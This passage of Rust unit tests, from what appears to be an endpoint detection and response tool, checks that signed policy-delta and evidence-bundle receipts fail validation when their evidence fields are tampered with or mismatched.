                    policy_epoch: 8,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                operation: "prepared",
                policy_delta_id: policy_delta_id.as_str(),
                staged_detection_id: "staged_detection:test",
                rule_id: "endpoint.policy_delta.test",
                stage: "audit",
                generated_at,
                action,
                artifact_hash: artifact_hash.as_str(),
                simulation_id: "simulation:test",
                graph_slice_id: "graph_slice:test",
                root_node_id: "node:test",
                source_affected_identity_context,
                source_affected_tool_context,
                cross_window_impact_hash: None,
                cross_window_recommendation_hash: None,
                previous_policy_hash: Some(previous_policy_hash.as_str()),
                new_policy_hash: Some(prepared_policy_hash.as_str()),
                backup_path: Some("/tmp/policy.yaml.backup"),
            });
        assert!(prepared_receipt.validate().is_ok());
        assert_eq!(
            prepared_receipt.decision.title.as_deref(),
            Some("Endpoint staged policy delta prepared")
        );

        let terminate_delta_id = endpoint_policy_delta_id(EndpointPolicyDeltaIdInput {
            endpoint_id: "endpoint-1",
            rule_id: "endpoint.policy_delta.terminate",
            action: &EndpointDecisionAction::TerminateProcessTree,
            staged_detection_id: "staged_detection:terminate",
            stage: "limited_block",
            generated_at,
            simulation_id: "simulation:terminate",
            graph_slice_id: "graph_slice:terminate",
            root_node_id: "node:terminate",
            source_affected_identity_context,
            source_affected_tool_context,
        });
        let terminate_receipt =
            EndpointDecisionReceipt::for_policy_delta(EndpointPolicyDeltaReceiptInput {
                local_sequence: 32,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                operation: "generated",
                policy_delta_id: terminate_delta_id.as_str(),
                staged_detection_id: "staged_detection:terminate",
                rule_id: "endpoint.policy_delta.terminate",
                stage: "limited_block",
                generated_at,
                action: EndpointDecisionAction::TerminateProcessTree,
                artifact_hash: artifact_hash.as_str(),
                simulation_id: "simulation:terminate",
                graph_slice_id: "graph_slice:terminate",
                root_node_id: "node:terminate",
                source_affected_identity_context,
                source_affected_tool_context,
                cross_window_impact_hash: None,
                cross_window_recommendation_hash: None,
                previous_policy_hash: None,
                new_policy_hash: None,
                backup_path: None,
            });
        assert!(terminate_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback-capable policy action"));

        let mut mismatched_delta_id = receipt.clone();
        if let Some(delta_id_evidence) = mismatched_delta_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "policyDeltaId")
        {
            *delta_id_evidence =
                EndpointReceiptEvidence::hashed("policyDeltaId", "policy_delta:other");
        }
        assert!(mismatched_delta_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta id evidence hash"));

        let mut relabeled_delta_id = receipt.clone();
        relabeled_delta_id.decision.finding_id = Some("policy_delta:other".to_string());
        if let Some(delta_id_evidence) = relabeled_delta_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "policyDeltaId")
        {
            *delta_id_evidence =
                EndpointReceiptEvidence::hashed("policyDeltaId", "policy_delta:other");
        }
        assert!(relabeled_delta_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta id"));

        let mut relabeled_generated_as_applied = receipt.clone();
        relabeled_generated_as_applied.decision.title =
            Some("Endpoint staged policy delta applied".to_string());
        if let Some(operation_evidence) = relabeled_generated_as_applied
            .evidence
            .iter_mut()
            .find(|item| item.key == "operation")
        {
            *operation_evidence = EndpointReceiptEvidence::hashed("operation", "applied");
        }
        assert!(relabeled_generated_as_applied
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta applied"));

        let mut missing_artifact_hash = receipt.clone();
        missing_artifact_hash
            .evidence
            .retain(|item| item.key != "artifactHash");
        assert!(missing_artifact_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta artifact hash evidence"));

        let mut missing_source_identity_context = receipt.clone();
        missing_source_identity_context
            .evidence
            .retain(|item| item.key != "sourceAffectedIdentityContext");
        assert!(missing_source_identity_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta source affected identity context evidence"));

        let mut relabeled_source_tool_context = receipt.clone();
        if let Some(tool_context_evidence) = relabeled_source_tool_context
            .evidence
            .iter_mut()
            .find(|item| item.key == "sourceAffectedToolContext")
        {
            *tool_context_evidence =
                EndpointReceiptEvidence::hashed("sourceAffectedToolContext", "[]");
        }
        assert!(relabeled_source_tool_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta id"));

        let mut mismatched_graph_slice = receipt.clone();
        if let Some(graph_slice_evidence) = mismatched_graph_slice
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta graph slice evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(root_node_evidence) = mismatched_root_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta root node reference"));
    }

    #[test]
    fn endpoint_evidence_bundle_manifest_receipt_binds_graph_slice_hash() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "bundle.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://bundle.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[16u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_evidence_bundle_manifest(
            EndpointEvidenceBundleManifestReceiptInput {
                local_sequence: 15,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                root_node_id: &process_node_id,
                bundle: &execution.evidence_bundle,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::EvidenceBundleManifest
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(execution.evidence_bundle.bundle_id.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "contentHash"));

        let mut mismatched_bundle_id = receipt.clone();
        if let Some(bundle_id_evidence) = mismatched_bundle_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "evidenceBundleId")
        {
            *bundle_id_evidence =
                EndpointReceiptEvidence::hashed("evidenceBundleId", "evidence_bundle:other");
        }
        assert!(mismatched_bundle_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence bundle id evidence hash"));

        let mut mismatched_node_count = receipt.clone();
        if let Some(node_count_evidence) = mismatched_node_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "nodeCount")
        {
            *node_count_evidence = EndpointReceiptEvidence::hashed("nodeCount", "0");
        }
        assert!(mismatched_node_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence bundle node count evidence hash"));

        let mut mismatched_content_hash = receipt.clone();
        if let Some(content_hash_evidence) = mismatched_content_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "contentHash")
        {
            *content_hash_evidence = EndpointReceiptEvidence::hashed("contentHash", "sha256:other");
        }
        assert!(mismatched_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence bundle content hash evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence bundle graph root reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence bundle graph slice reference"));
    }

    fn response_actor(endpoint_id: &str) -> EndpointDecisionActor {
        EndpointDecisionActor {
            endpoint_id: endpoint_id.to_string(),
            session_id: Some("session-response".to_string()),
            posture: Some("restricted".to_string()),
            agent_id: Some("agent-api:test".to_string()),
            workload_id: Some("endpoint-response-engine".to_string()),
            ..EndpointDecisionActor::default()
        }
    }

    fn valid_detection_receipt(
        local_sequence: u64,
        endpoint_id: &str,
        signer_identity: &str,
        observation: &EndpointObservation,
        finding: &DetectionFinding,
        graph: &CausalGraph,
    ) -> EndpointDecisionReceipt {
        EndpointDecisionReceipt::for_detection(EndpointDetectionReceiptInput {
            local_sequence,
            endpoint_id,
            signer_identity,
            policy: EndpointPolicySnapshot {
                policy_version: "test-policy@1".to_string(),
                policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                policy_epoch: 7,
            },
            sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
            observation,
            finding,
            graph,
        })
    }

    fn temp_root() -> PathBuf {
        let millis = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis();
        let counter = TEMP_ROOT_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-edr-test-{}-{millis}-{counter}",
            std::process::id(),
        ))
    }
}
